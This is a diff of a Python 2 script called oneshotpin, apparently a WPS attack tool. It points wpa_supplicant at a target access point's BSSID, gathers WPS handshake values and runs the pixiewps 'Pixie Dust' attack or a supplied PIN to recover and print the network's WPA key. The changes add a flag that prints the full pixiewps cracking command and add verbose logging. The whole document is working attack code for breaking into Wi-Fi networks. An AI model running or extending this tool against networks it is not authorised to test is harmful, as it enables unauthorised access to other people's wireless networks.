@@ -1,3 +1,5 @@
+#!/usr/bin/env python2
+
 import sys, subprocess, os, tempfile, shutil
 
 class Data():
@@ -18,6 +20,7 @@ class Options():
 		self.pin = None
 		self.pixiemode = False
 		self.verbose = False
+		self.showpixiecmd = False
 
 def shellcmd(cmd):
 	proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
@@ -125,7 +128,7 @@ def die(msg):
 def usage():
 	die( \
 """
-oneshotpin 0.0.1 (c) 2017 rofl0r
+oneshotpin 0.0.2 (c) 2017 rofl0r
 
 Required Arguments:
 	-i, --interface=<wlan0>  Name of the interface to use
@@ -134,12 +137,16 @@ Required Arguments:
 Optional Arguments:
 	-p, --pin=<wps pin>      Use the specified pin (arbitrary string or 4/8 digit pin)
 	-K, --pixie-dust         Run pixiedust attack
+	-X                       Alway print pixiewps command
 	-v                       Verbose output
 
 Example:
 	%s -i wlan0 -b 00:90:4C:C1:AC:21 -p 12345670 -K
 """ % sys.argv[0])
 
+def get_pixie_cmd(data):
+	return "pixiewps --pke %s --pkr %s --e-hash1 %s --e-hash2 %s --authkey %s --e-nonce %s" % \
+		(data.pke, data.pkr, data.e_hash1, data.e_hash2, data.authkey, data.e_nonce)
 
 def cleanup(wpas, wpac, options):
 	wpac.stdin.write('terminate\nquit\n')
@@ -152,12 +159,13 @@ if __name__ == '__main__':
 	options = Options()
 
 	import getopt
-	optlist, args = getopt.getopt(sys.argv[1:], ":e:i:b:p:Kv", ["help", "interface", "bssid", "pin", "pixie-dust"])
+	optlist, args = getopt.getopt(sys.argv[1:], ":e:i:b:p:XKv", ["help", "interface", "bssid", "pin", "pixie-dust"])
 	for a,b in optlist:
 		if   a in ('-i', "--interface"): options.interface = b
 		elif a in ('-b', "--bssid"): options.bssid = b
 		elif a in ('-p', "--pin"): options.pin = b
 		elif a in ('-K', "--pixie-dust"): options.pixiemode = True
+		elif a in ('-X'): options.showpixiecmd = True
 		elif a in ('-v'): options.verbose = True
 		elif a == '--help': usage()
 	if not options.interface or not options.bssid:
@@ -172,7 +180,10 @@ if __name__ == '__main__':
 
 	data = Data()
 	wpas = run_wpa_supplicant(options)
-	recvuntil(wpas, 'update_config=1')
+	while True:
+		s = recvuntil(wpas, '\n')
+		if options.verbose: sys.stderr.write(s)
+		if 'update_config=1' in s: break
 
 	wpac = run_wpa_cli(options)
 	recvuntil(wpac, '\n> ')
@@ -180,6 +191,8 @@ if __name__ == '__main__':
 #	while True:
 #		sys.stderr.write( wpac.stdout.read(1) )
 	recvuntil(wpac, 'OK')
+
+	pixiecmd = None
 
 	while True:
 		try:
@@ -190,20 +203,23 @@ if __name__ == '__main__':
 
 		if not res: break
 
-		if options.pixiemode and got_all_pixie_data(data):
+		if got_all_pixie_data(data):
+			pixiecmd = get_pixie_cmd(data)
+
+		if options.pixiemode and pixiecmd:
 			cleanup(wpas, wpac, options)
-			cmd = "pixiewps --pke %s --pkr %s --e-hash1 %s --e-hash2 %s --authkey %s --e-nonce %s" % \
-				(data.pke, data.pkr, data.e_hash1, data.e_hash2, data.authkey, data.e_nonce)
-			print "running %s" % cmd
-			os.execlp('/bin/sh', '/bin/sh', '-c', cmd)
+			print "running %s" % pixiecmd
+			os.execlp('/bin/sh', '/bin/sh', '-c', pixiecmd)
 			# shouldnt get here
 			sys.exit(1)
 
-		if not options.pixiemode and data.wpa_psk:
+		if data.wpa_psk:
+			if options.showpixiecmd and pixiecmd: print pixiecmd
 			cleanup(wpas, wpac, options)
-			print "got key: %s" % data.wpa_psk
+			print "!!! GOT WPA KEY !!!: %s" % data.wpa_psk
 			sys.exit(0)
 
 	print "hmm, seems something went wrong..."
+	if options.showpixiecmd and pixiecmd: print pixiecmd
 	cleanup(wpas, wpac, options)
 	sys.exit(1)
